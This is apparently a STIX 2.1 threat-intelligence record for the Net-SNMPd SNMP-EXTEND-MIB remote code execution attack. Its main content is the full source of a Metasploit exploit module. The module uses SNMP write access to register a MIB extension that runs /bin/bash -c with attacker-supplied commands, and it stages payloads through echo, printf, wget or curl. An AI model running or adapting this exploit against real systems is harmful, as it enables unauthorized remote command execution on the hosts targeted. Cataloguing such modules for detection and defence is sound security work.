{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9c61e9ca-87be-409d-afe8-8d7d827f148c",
    "created": "2024-08-14T16:58:21.161204Z",
    "modified": "2024-08-14T16:58:21.161208Z",
    "name": "Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution",
    "description": "( This exploit module exploits the SNMP write access configuration ability of SNMP-EXTEND-MIB to configure MIB extensions and lead to remote code execution. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/snmp/net_snmpd_rw_access.rb",
            "external_id": "net_snmpd_rw_access.rb"
        },
        {
            "source_name": "reference",
            "url": "http://net-snmp.sourceforge.net/docs/mibs/NET-SNMP-EXTEND-MIB.txt"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e"
        },
        {
            "source_name": "reference",
            "url": "https://digi.ninja/blog/snmp_to_shell.php"
        },
        {
            "source_name": "reference",
            "url": "https://sourceforge.net/p/net-snmp/mailman/message/15735617/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'snmp'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution',\n        'Description'    => %q(\n            This exploit module exploits the SNMP write access configuration ability of SNMP-EXTEND-MIB to\n            configure MIB extensions and lead to remote code execution.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         => ['Steve Embling at InteliSecure'],\n        'References'     =>\n          [\n            [ 'URL', 'http://net-snmp.sourceforge.net/docs/mibs/NET-SNMP-EXTEND-MIB.txt'],\n            [ 'URL', 'https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e'],\n            [ 'URL', 'https://digi.ninja/blog/snmp_to_shell.php'],\n            [ 'URL', 'https://sourceforge.net/p/net-snmp/mailman/message/15735617/']\n          ],\n        'Payload'        =>\n          {\n            'Space'    => 4096\n            #note space above is not a hard limit and can be increased if required\n            #'BadChars' => \"\\x00\"\n          },\n        'Targets'        =>\n        [\n          ['Linux x86', {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux',\n              'CmdStagerFlavor' => [ :echo, :printf, :bourne, :wget, :curl ]}],\n          ['Linux x64', {\n              'Arch' => ARCH_X64,\n              'Platform' => 'linux',\n              'CmdStagerFlavor' => [ :echo, :printf, :bourne, :wget, :curl ]}]\n          ],\n          #Not tested on other platforms but confirmed the above works.\n        'DisclosureDate' => '2004-05-10',\n        'DefaultTarget'  => 0,\n      )\n    )\n    register_options(\n      [\n        OptString.new('FILEPATH', [true, 'file path to write to ', '/tmp']),\n        OptString.new('CHUNKSIZE', [true, 'Maximum bytes of payload to write at once ', 200]),\n        OptString.new('SHELL', [true, 'Shell to call with -c argument', '/bin/bash'])\n      ])\n  end\n\n  # The exploit method connects and sets:\n  # NET-SNMP-EXTEND-MIB::nsExtendStatus.\"tmp\" = INTEGER: createAndGo(4)\n  # NET-SNMP-EXTEND-MIB::nsExtendCommand.\"tmp\" = STRING: /path/to/executable\n  # NET-SNMP-EXTEND-MIB::nsExtendArgs.\"tmp\" = STRING: arguments\n  def execute_command(cmd, opts = {})\n    oid_1 = '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.116.109.112'\n    oid_1_value = 4\n    oid_2 = '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.116.109.112'\n    oid_2_value =  datastore['SHELL']\n    oid_3 = '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.116.109.112'\n    oid_4 = '1.3.6.1.4.1.8072.1.3.2.4.1.2.3.116.109.112.1'\n\n    comm = datastore['COMMUNITY']\n\n    cmd = cmd.shellescape unless flavor == :bourne\n\n    oid_3_value = \"-c \\\"#{cmd}\\\"\"\n\n    vprint_status(oid_3_value)\n    SNMP::Manager.open(:Host => rhost, :Port => rport, :Community => comm) do |manager|\n      #vprint_status(manager.get_value(\"sysDescr.0\"))\n      varbind1 = SNMP::VarBind.new(oid_1,SNMP::Integer.new(oid_1_value))\n      varbind2 = SNMP::VarBind.new(oid_2,SNMP::OctetString.new(oid_2_value))\n      varbind3 = SNMP::VarBind.new(oid_3,SNMP::OctetString.new(oid_3_value))\n      resp = manager.set([varbind1, varbind2, varbind3])\n      vprint_status(manager.get_value(oid_4).to_s)\n    end\n    #Hit same again, first rewrite  appears to remove the MIB, the next reinstates it.\n    SNMP::Manager.open(:Host => rhost, :Port => rport, :Community => comm) do |manager|\n      varbind1 = SNMP::VarBind.new(oid_1,SNMP::Integer.new(oid_1_value))\n      varbind2 = SNMP::VarBind.new(oid_2,SNMP::OctetString.new(oid_2_value))\n      varbind3 = SNMP::VarBind.new(oid_3,SNMP::OctetString.new(oid_3_value))\n      begin\n        resp = manager.set([varbind1, varbind2, varbind3])\n        vprint_status(manager.get_value(oid_4).to_s)\n      rescue SNMP::RequestTimeout\n        print_good(\"SNMP request timeout (this is promising).\")\n      end\n    end\n  end\n\n  def exploit\n    execute_cmdstager(linemax: datastore['CHUNKSIZE'].to_i, :temp => datastore['FILEPATH'])\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-05-10",
    "x_mitre_platforms": [
        "linux'"
    ]
}